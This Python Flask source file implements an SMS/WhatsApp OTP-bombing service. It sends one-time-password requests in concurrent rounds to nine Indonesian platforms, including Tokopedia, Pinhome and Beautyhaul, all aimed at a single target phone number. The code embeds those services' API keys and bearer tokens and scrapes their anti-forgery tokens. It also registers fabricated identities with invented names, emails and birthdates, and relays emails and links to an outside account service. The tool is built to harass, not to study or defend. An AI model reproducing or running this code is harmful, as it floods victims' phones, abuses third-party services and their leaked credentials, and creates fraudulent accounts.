import re
import time
import json
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from flask import Flask, jsonify, request

app = Flask(__name__)

# ============================================================
# OTP ENDPOINTS
# ============================================================
OTP_ENDPOINTS = {
    "adiraku": {
        "name": "Adiraku", "method": "POST",
        "url": "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "payload": {"mobileNumber": "{local}", "type": "prospect-create", "channel": "whatsapp"},
        "success_check": "body_contains", "success_value": '"message":"success"',
    },
    "tokopedia": {
        "name": "Tokopedia", "two_step": True,
        "step1": {
            "method": "GET",
            "url": "https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={phone_no_plus}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister",
            "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
            "extract_token": {"regex": r'<input\s+id="Token"\s+value="([^"]+)"', "save_as": "tk"},
        },
        "step2": {
            "method": "POST",
            "url": "https://accounts.tokopedia.com/otp/c/ajax/request-wa",
            "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
            "payload": {"otp_type": "116", "msisdn": "{phone_no_plus}", "tk": "{tk}",
                        "email": "", "original_param": "", "user_id": "", "signature": "",
                        "number_otp_digit": "6"},
        },
        "success_check": "status_code", "success_value": 200,
    },
    "singa": {
        "name": "Singa", "method": "POST",
        "url": "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.7&versionCode=153&model=SM-G975F&systemVersion=16&platform=android&appsflyer_id=",
        "headers": {"Content-Type": "application/json; charset=utf-8",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 11)"},
        "payload": {"mobile_phone": "{phone_no_plus}", "type": "mobile", "is_switchable": 1},
        "success_check": "json_field", "json_field": "msg", "success_value": "Success",
    },
    "jogjakita": {
        "name": "Jogjakita", "two_step": True,
        "step1": {
            "method": "POST", "url": "https://aci-user.bmsecure.id/oauth/token",
            "headers": {
                "Authorization": "Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ==",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            "payload": {"grant_type": "client_credentials",
                        "uuid": "00000000-0000-0000-0000-000000000000",
                        "id_user": "0", "id_kota": "0", "location": "0.0,0.0",
                        "via": "jogjakita_user", "version_code": "521", "version_name": "6.12.1"},
            "extract_token": {"json_field": "access_token", "save_as": "auth"},
        },
        "step2": {
            "method": "POST", "url": "https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send",
            "headers": {"Content-Type": "application/json; charset=UTF-8",
                        "Authorization": "Bearer {auth}"},
            "payload": {"phone_user": "{phone_no_plus}",
                        "primary_credential": {"device_id": "", "fcm_token": "", "id_kota": 0,
                                               "id_user": 0, "location": "0.0,0.0", "uuid": "",
                                               "version_code": "521", "version_name": "6.12.1",
                                               "via": "jogjakita_user"},
                        "uuid": "00000000-4c22-250d-3006-9a465f072739{random8}",
                        "version_code": "521", "version_name": "6.12.1", "via": "jogjakita_user"},
        },
        "success_check": "json_field", "json_field": "rc", "success_value": "200",
    },
    "pinhome": {
        "name": "Pinhome", "method": "POST",
        "url": "https://www.pinhome.id/api/pinaccount/request/otp",
        "headers": {"Accept": "application/json",
                    "Authorization": "Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
                    "Content-Type": "application/json",
                    "Origin": "https://www.pinhome.id"},
        "payload": {"accountType": "customers", "countryCode": "62", "medium": "whatsapp",
                    "otpType": "register", "phoneNumber": "{local}"},
        "success_check": "status_below", "success_value": 400,
    },
    "duniagames": {
        "name": "Duniagames", "method": "POST",
        "url": "https://api.duniagames.co.id/api/user/api/v2/user/send-otp",
        "headers": {"accept": "application/json, text/plain, */*",
                    "content-type": "application/json",
                    "origin": "https://duniagames.co.id",
                    "x-device": "1ee352b7-d541-418f-a7b9-82d9358ea6a4"},
        "payload": {"phoneNumber": "{phone_plus}", "userName": "{local}"},
        "success_check": "status_code", "success_value": 200,
    },
    "saturdays": {
        "name": "Saturdays", "method": "POST",
        "url": "https://beta.api.saturdays.com/api/v1/user/otp/send",
        "headers": {"content-type": "application/json",
                    "origin": "https://saturdays.com",
                    "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj",
                    "country-code": "ID", "device-type": "mweb", "platform": "mweb"},
        "payload": {"number": "{local}", "country_code": "+62", "type": ""},
        "success_check": "status_code", "success_value": 200,
    },
    "maulagi": {
        "name": "Maulagi", "method": "POST",
        "url": "https://api.maulagi.id/api/v2/auth/check",
        "headers": {"accept": "application/json, text/plain, */*",
                    "content-type": "application/json",
                    "origin": "https://maulagi.id",
                    "x-ml-key": "E32VCHXX32"},
        "payload": {"credentials": "{local}"},
        "success_check": "status_below", "success_value": 400,
    },
    "beautyhaul": {
        "name": "Beautyhaul", "three_step": True,
        "step1": {"method": "GET", "url": "https://www.beautyhaul.com/account/register",
                  "headers": {"user-agent": "Mozilla/5.0 (Linux; Android 14) Chrome/107"}},
        "step2": {"method": "POST", "url": "https://www.beautyhaul.com/ajax/account/save_register",
                  "headers": {"content-type": "application/json",
                              "origin": "https://www.beautyhaul.com",
                              "referer": "https://www.beautyhaul.com/account/register"},
                  "payload": {"nama_depan": "{first_name}", "nama_belakang": "{last_name}",
                              "email": "{email}", "g-recaptcha-response": "",
                              "jenis_kelamin": "{gender}", "konfirmasi_password": "{password}",
                              "nomor_kode_id": "100", "nomor_kode_value": "62",
                              "nomor_ponsel": "{local_no_0}", "password": "{password}",
                              "subscribe": "true", "tanggal_lahir": "{birthdate}", "terms": "true"}},
        "step3": {"method": "POST", "url": "https://www.beautyhaul.com/ajax/account/send_otp",
                  "headers": {"content-type": "application/json",
                              "origin": "https://www.beautyhaul.com",
                              "referer": "https://www.beautyhaul.com/account/register"},
                  "payload": {"method": "WhatsApp"}},
        "success_check": "status_code", "success_value": 200,
    },
}

FIRST = ["Budi","Siti","Agus","Dewi","Rizki","Nur","Andi","Putri"]
LAST = ["Santoso","Rahayu","Wijaya","Kusuma","Pratama","Sari"]

def rnd(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def fake_ident():
    fn = random.choice(FIRST); ln = random.choice(LAST)
    return {
        "first_name": fn, "last_name": ln,
        "email": f"{fn.lower()}.{ln.lower()}{random.randint(10,99)}@gmail.com",
        "password": "Aa1!" + rnd(10),
        "gender": random.choice(["Laki-laki", "Perempuan"]),
        "birthdate": f"199{random.randint(0,9)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}",
        "device_model": "SM-G975F",
        "device_ua": "Mozilla/5.0 (Linux; Android 11)",
        "random8": rnd(8),
    }

def normalize_phone(phone):
    d = re.sub(r"\D", "", str(phone))
    if d.startswith("0"): d = "62" + d[1:]
    elif d.startswith("8"): d = "62" + d
    elif not d.startswith("62"): d = "62" + d
    local = d[2:] if d.startswith("62") else d
    return {"digits": d, "local": local, "local_no_0": local if local.startswith("0") else "0"+local,
            "phone_plus": "+"+d, "phone_no_plus": d}

def sub_ctx(v, ctx):
    if isinstance(v, str):
        out = v
        for k, x in ctx.items(): out = out.replace("{"+k+"}", str(x))
        return out
    if isinstance(v, dict): return {k: sub_ctx(x, ctx) for k, x in v.items()}
    if isinstance(v, list): return [sub_ctx(x, ctx) for x in v]
    return v

def do_req(method, url, headers, payload, form=False):
    kw = {"headers": headers, "timeout": 12}
    if payload is not None:
        if form: kw["data"] = payload
        else: kw["json"] = payload
    return requests.request(method, url, **kw)

def check_success(cfg, r):
    k = cfg.get("success_check")
    if k == "status_code": return r.status_code == cfg["success_value"], str(r.status_code)
    if k == "status_below": return r.status_code < cfg["success_value"], str(r.status_code)
    if k == "body_contains": return cfg["success_value"] in r.text, r.text[:100]
    if k == "json_field":
        try: d = r.json()
        except ValueError: return False, "not-json"
        return str(d.get(cfg["json_field"])) == str(cfg["success_value"]), str(d.get(cfg["json_field"]))
    return False, "?"

def hit_otp(key, cfg, phone):
    p = normalize_phone(phone)
    ctx = {**p, **fake_ident()}
    try:
        if cfg.get("two_step") or cfg.get("three_step"):
            steps = [cfg["step1"], cfg["step2"], cfg["step3"]] if cfg.get("three_step") else [cfg["step1"], cfg["step2"]]
            saved = {}; last = None
            for st in steps:
                url = sub_ctx(st["url"], {**ctx, **saved})
                hdr = sub_ctx(st.get("headers", {}), {**ctx, **saved})
                pl = sub_ctx(st.get("payload"), {**ctx, **saved})
                form = "x-www-form-urlencoded" in hdr.get("Content-Type", "")
                r = do_req(st["method"], url, hdr, pl, form=form)
                last = r
                ext = st.get("extract_token")
                if ext:
                    if "regex" in ext:
                        m = re.search(ext["regex"], r.text)
                        if not m: return key, cfg["name"], False, "token-miss"
                        saved[ext["save_as"]] = m.group(1)
                    elif "json_field" in ext:
                        try: saved[ext["save_as"]] = r.json()[ext["json_field"]]
                        except (ValueError, KeyError): return key, cfg["name"], False, "token-miss"
            ok, d = check_success(cfg, last)
            return key, cfg["name"], ok, d
        url = sub_ctx(cfg["url"], ctx)
        hdr = sub_ctx(cfg.get("headers", {}), ctx)
        pl = sub_ctx(cfg.get("payload"), ctx)
        form = "x-www-form-urlencoded" in hdr.get("Content-Type", "")
        r = do_req(cfg["method"], url, hdr, pl, form=form)
        ok, d = check_success(cfg, r)
        return key, cfg["name"], ok, d
    except requests.RequestException as e:
        return key, cfg["name"], False, type(e).__name__
    except Exception as e:
        return key, cfg["name"], False, type(e).__name__

# ============================================================
# ROUTES
# ============================================================

@app.route("/api/health", methods=["GET", "POST"])
def health():
    return jsonify(ok=True, service="multi-tool", ts=time.time())

@app.route("/api/providers", methods=["GET"])
def providers():
    return jsonify([{"key": k, "name": v["name"]} for k, v in OTP_ENDPOINTS.items()])

@app.route("/api/otp", methods=["POST"])
def otp_spam():
    data = request.get_json(force=True) or {}
    phone = (data.get("phone") or "").strip()
    if not phone: return jsonify(ok=False, error="phone required"), 400
    rounds = max(1, min(int(data.get("rounds", 1)), 10))
    workers = max(1, min(int(data.get("workers", 5)), 20))
    filter_keys = data.get("providers")
    norm = normalize_phone(phone)

    entries = [(k, cfg) for k, cfg in OTP_ENDPOINTS.items()
               if not filter_keys or k in filter_keys]
    tasks = [(k, cfg) for _ in range(rounds) for k, cfg in entries]

    t0 = time.time()
    results = []
    ok = fail = 0

    def worker(task):
        k, cfg = task
        return hit_otp(k, cfg, norm["phone_plus"])

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(worker, t) for t in tasks]
        for f in as_completed(futs):
            k, name, success, detail = f.result()
            results.append({"key": k, "provider": name, "ok": success, "detail": detail})
            if success: ok += 1
            else: fail += 1

    return jsonify({
        "ok": True,
        "phone": norm["phone_plus"],
        "total": len(tasks),
        "ok_count": ok,
        "fail_count": fail,
        "duration": round(time.time() - t0, 2),
        "results": sorted(results, key=lambda x: x["provider"]),
    })

@app.route("/api/am/send", methods=["POST"])
def am_send():
    data = request.get_json(force=True) or {}
    email = (data.get("email") or "").strip()
    if not email: return jsonify(ok=False, error="email required"), 400
    if not re.match(r"^[^\s@]+@[^\s@]+\.[^\s@]+$", email):
        return jsonify(ok=False, error="format email salah"), 400

    try:
        r = requests.post("https://api.zyvor.my.id/api/am/sendv2",
                          json={"email": email}, timeout=20)
        try: body = r.json()
        except ValueError: body = {"raw": r.text[:500]}
        return jsonify({
            "ok": r.status_code == 200,
            "status": r.status_code,
            "email": email,
            "response": body,
        })
    except requests.RequestException as e:
        return jsonify(ok=False, error=f"upstream: {type(e).__name__}"), 502

@app.route("/api/am/verify", methods=["POST"])
def am_verify():
    data = request.get_json(force=True) or {}
    email = (data.get("email") or "").strip()
    link = (data.get("link") or "").strip()
    if not email: return jsonify(ok=False, error="email required"), 400
    if not re.match(r"^[^\s@]+@[^\s@]+\.[^\s@]+$", email):
        return jsonify(ok=False, error="format email salah"), 400
    if not link: return jsonify(ok=False, error="link required"), 400
    if not link.startswith("https://"):
        return jsonify(ok=False, error="link harus diawali https://"), 400

    try:
        r = requests.post("https://api.zyvor.my.id/api/am/verify",
                          json={"email": email, "link": link}, timeout=20)
        try: body = r.json()
        except ValueError: body = {"raw": r.text[:500]}
        return jsonify({
            "ok": r.status_code == 200,
            "status": r.status_code,
            "email": email,
            "link": link,
            "response": body,
        })
    except requests.RequestException as e:
        return jsonify(ok=False, error=f"upstream: {type(e).__name__}"), 502

# catch-all: kalau bukan /api/*, balikin index
@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def static_files(path):
    if path.startswith("api/"):
        return jsonify(ok=False, error="not found"), 404
    return jsonify(ok=True, hint="static files served by Vercel from public/")
